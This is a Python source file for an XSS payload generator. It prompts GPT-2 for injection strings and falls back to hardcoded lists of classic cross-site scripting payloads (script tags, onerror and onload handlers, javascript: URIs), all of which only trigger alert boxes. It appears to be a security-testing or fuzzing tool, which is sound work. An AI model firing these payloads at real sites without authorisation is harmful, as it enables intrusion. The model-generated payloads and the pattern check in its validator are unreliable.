import random
import re
from typing import List, Dict

# Try to import AI dependencies with fallback
try:
    import torch
    from transformers import GPT2LMHeadModel, GPT2Tokenizer, pipeline
    TORCH_AVAILABLE = True
    TRANSFORMERS_AVAILABLE = True
except ImportError:
    TORCH_AVAILABLE = False
    TRANSFORMERS_AVAILABLE = False
    print("Warning: torch/transformers not available. Transformer generator will use fallback methods.")

class TransformerPayloadGenerator:
    """
    Advanced transformer-based XSS payload generator
    Uses fine-tuned language models for context-aware generation
    """
    
    def __init__(self):
        print("🤖 Initializing Transformer Payload Generator...")
        
        # Initialize components based on availability
        self.tokenizer = None
        self.model = None
        self.generator = None
        
        # Load pre-trained models if available
        if TORCH_AVAILABLE and TRANSFORMERS_AVAILABLE:
            try:
                self.tokenizer = GPT2Tokenizer.from_pretrained('gpt2')
                self.model = GPT2LMHeadModel.from_pretrained('gpt2')
                
                # Set padding token
                self.tokenizer.pad_token = self.tokenizer.eos_token
                
                # Initialize generation pipeline
                self.generator = pipeline(
                    'text-generation',
                    model=self.model,
                    tokenizer=self.tokenizer,
                    max_length=100,
                    num_return_sequences=5,
                    temperature=0.8,
                    do_sample=True,
                    pad_token_id=self.tokenizer.eos_token_id
                )
                print("✅ Transformer models loaded successfully")
            except Exception as e:
                print(f"Warning: Could not load transformer models: {e}")
        else:
            print("⚠️ Using fallback payload generation (no AI models available)")
        
        # XSS context templates
        self.context_templates = {
            'html_injection': [
                "HTML injection payload for {context}: <",
                "Inject into HTML attribute {context}: ",
                "DOM-based XSS in {context}: <script>"
            ],
            'js_injection': [
                "JavaScript injection for {context}: alert(",
                "JS payload in {context}: eval(",
                "Script injection {context}: document."
            ],
            'url_injection': [
                "URL parameter injection {context}: javascript:",
                "GET parameter XSS {context}: %3Cscript%3E",
                "Query string payload {context}: <svg"
            ]
        }
        
        print("✅ Transformer Generator ready!")
    
    def generate_context_payloads(self, context: str, count: int = 5) -> List[str]:
        """Generate context-aware XSS payloads"""
        payloads = []
        
        # Try AI generation first
        if self.generator:
            try:
                ai_payloads = self._generate_ai_payloads(context, count)
                payloads.extend(ai_payloads)
            except Exception as e:
                print(f"Warning: AI generation failed: {e}")
        
        # Fallback to template-based generation
        if len(payloads) < count:
            fallback_payloads = self._generate_fallback_payloads(context, count - len(payloads))
            payloads.extend(fallback_payloads)
        
        return payloads[:count]
    
    def _generate_ai_payloads(self, context: str, count: int) -> List[str]:
        """Generate payloads using AI models"""
        if not self.generator:
            return []
        
        try:
            # Create context-aware prompts
            prompts = [
                f"XSS payload for {context}: <script>",
                f"JavaScript injection in {context}: alert(",
                f"HTML injection {context}: <img src=",
                f"DOM XSS {context}: document.write(",
                f"Event handler {context}: onload="
            ]
            
            generated_payloads = []
            for prompt in prompts[:count]:
                try:
                    result = self.generator(prompt, max_length=50, num_return_sequences=1)
                    if result and len(result) > 0:
                        generated_text = result[0]['generated_text']
                        # Extract the generated part (remove the prompt)
                        payload = generated_text[len(prompt):].strip()
                        if payload and len(payload) > 5:
                            generated_payloads.append(payload)
                except Exception as e:
                    print(f"Warning: Failed to generate payload for prompt '{prompt}': {e}")
                    continue
            
            return generated_payloads
        except Exception as e:
            print(f"Warning: AI payload generation failed: {e}")
            return []
    
    def _generate_fallback_payloads(self, context: str, count: int) -> List[str]:
        """Generate payloads using templates and rules"""
        payloads = []
        
        # Basic XSS payloads
        basic_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<object data="javascript:alert(\'XSS\')">',
            '<embed src="javascript:alert(\'XSS\')">',
            '<marquee onstart=alert("XSS")>',
            '<details open ontoggle=alert("XSS")>'
        ]
        
        # Context-specific payloads
        if 'html' in context.lower():
            payloads.extend([
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>'
            ])
        elif 'js' in context.lower() or 'javascript' in context.lower():
            payloads.extend([
                'alert("XSS")',
                'eval("alert(\'XSS\')")',
                'document.write("<script>alert(\'XSS\')</script>")'
            ])
        elif 'url' in context.lower() or 'parameter' in context.lower():
            payloads.extend([
                'javascript:alert("XSS")',
                '%3Cscript%3Ealert("XSS")%3C/script%3E',
                '<svg onload=alert("XSS")>'
            ])
        else:
            payloads.extend(basic_payloads)
        
        # Add some randomization
        random.shuffle(payloads)
        return payloads[:count]
    
    def _extract_xss_payload(self, text: str) -> str:
        """Extract XSS payload from generated text"""
        # Look for HTML tags
        html_match = re.search(r'<[^>]*>', text)
        if html_match:
            return html_match.group(0)
        
        # Look for JavaScript
        js_match = re.search(r'(alert\([^)]*\)|eval\([^)]*\)|document\.[a-zA-Z]+)', text)
        if js_match:
            return js_match.group(0)
        
        # Look for event handlers
        event_match = re.search(r'on[a-zA-Z]+=["\']*[^"\']*["\']', text)
        if event_match:
            return f'<img {event_match.group(0)}>'
        
        return text[:100]  # Return first 100 chars if no specific pattern
    
    def _is_valid_xss(self, payload: str) -> bool:
        """Validate if payload is a potential XSS"""
        xss_indicators = [
            '<script', 'javascript:', 'alert(', 'eval(', 'document.',
            'on[a-zA-Z]+=', '<img', '<svg', '<iframe', '<object',
            'onerror', 'onload', 'onclick', 'onmouseover'
        ]
        
        return any(indicator in payload.lower() for indicator in xss_indicators)
    
    def _generate_transformer_inspired_payloads(self, context: str) -> List[str]:
        """Generate payloads inspired by transformer patterns"""
        return [
            f'<script>/* {context} */alert("Transformer-XSS")</script>',
            f'<img src=x onerror=/* {context} */alert("Transformer-XSS")>',
            f'<svg onload=/* {context} */alert("Transformer-XSS")>',
            f'<iframe srcdoc="<script>/* {context} */alert(\'Transformer-XSS\')</script>">',
            f'<details open ontoggle=/* {context} */alert("Transformer-XSS")>',
            f'<marquee onstart=/* {context} */alert("Transformer-XSS")>',
            f'<video><source onerror=/* {context} */alert("Transformer-XSS")>',
            f'<audio src=x onerror=/* {context} */alert("Transformer-XSS")>',
        ]

print("🤖 Transformer Payload Generator created!") 